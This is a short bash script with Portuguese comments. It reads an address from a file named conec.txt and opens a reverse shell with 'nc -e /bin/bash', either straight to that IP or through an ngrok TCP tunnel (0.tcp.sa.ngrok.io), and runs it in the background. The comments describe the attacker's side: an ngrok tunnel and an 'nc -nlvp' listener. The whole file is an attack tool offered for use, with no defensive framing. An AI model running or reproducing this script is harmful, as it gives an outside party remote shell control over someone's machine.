#!/bin/bash

#ngrok tcp => abre a conexão tcp
#nc -nlvp => fica escutando


IP=`head conec.txt -n 2`


LI=`wc -l conec.txt | awk -F " " '{ print $1 }'`

case $LI in
        1)
                NC=`nc -e /bin/bash $IP &`;;
        2)
                NG=`nc 0.tcp.sa.ngrok.io $IP -e /bin/bash &`;;
esac

